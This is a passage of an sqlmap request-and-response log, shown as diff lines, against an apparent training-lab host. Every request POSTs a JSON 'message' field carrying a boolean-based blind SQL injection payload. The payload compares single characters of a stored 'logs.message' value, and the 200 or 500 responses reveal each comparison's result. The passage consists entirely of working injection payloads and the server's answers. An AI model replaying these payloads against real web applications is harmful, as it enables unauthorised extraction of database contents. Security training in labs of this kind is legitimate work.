+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),7,1)>CHAR(99))||'"}
+
+HTTP response [#206] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:15 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#207]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),7,1)>CHAR(100))||'"}
+
+HTTP response [#207] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:15 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#208]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),7,1)>CHAR(101))||'"}
+
+HTTP response [#208] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:16 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#209]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),8,1)>CHAR(96))||'"}
+
+HTTP response [#209] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:16 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#210]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),8,1)>CHAR(112))||'"}
+
+HTTP response [#210] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:16 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#211]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),8,1)>CHAR(104))||'"}
+
+HTTP response [#211] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:17 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#212]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),8,1)>CHAR(100))||'"}
+
+HTTP response [#212] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:17 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#213]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),8,1)>CHAR(98))||'"}
+
+HTTP response [#213] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:17 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#214]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),8,1)>CHAR(97))||'"}
+
+HTTP response [#214] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:18 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#215]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),9,1)>CHAR(96))||'"}
+
+HTTP response [#215] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:18 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#216]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),9,1)>CHAR(49))||'"}
+
+HTTP response [#216] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:18 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#217]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),9,1)>CHAR(72))||'"}
+
+HTTP response [#217] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:19 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#218]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),9,1)>CHAR(60))||'"}
+
+HTTP response [#218] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:19 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#219]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),9,1)>CHAR(54))||'"}
+
+HTTP response [#219] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:19 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#220]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),9,1)>CHAR(51))||'"}
+
+HTTP response [#220] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:20 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#221]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 163
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),9,1)>CHAR(50))||'"}
+
+HTTP response [#221] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:20 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#222]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),10,1)>CHAR(47))||'"}
+
+HTTP response [#222] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:21 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#223]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),10,1)>CHAR(87))||'"}
+
+HTTP response [#223] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:21 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#224]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),10,1)>CHAR(107))||'"}
+
+HTTP response [#224] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:21 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#225]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),10,1)>CHAR(97))||'"}
+
+HTTP response [#225] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:22 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#226]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(71,67,69,74) WHERE 8003=8003 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 9,1),10,1)>CHAR(102))||'"}
+
+HTTP response [#226] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:21:22 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
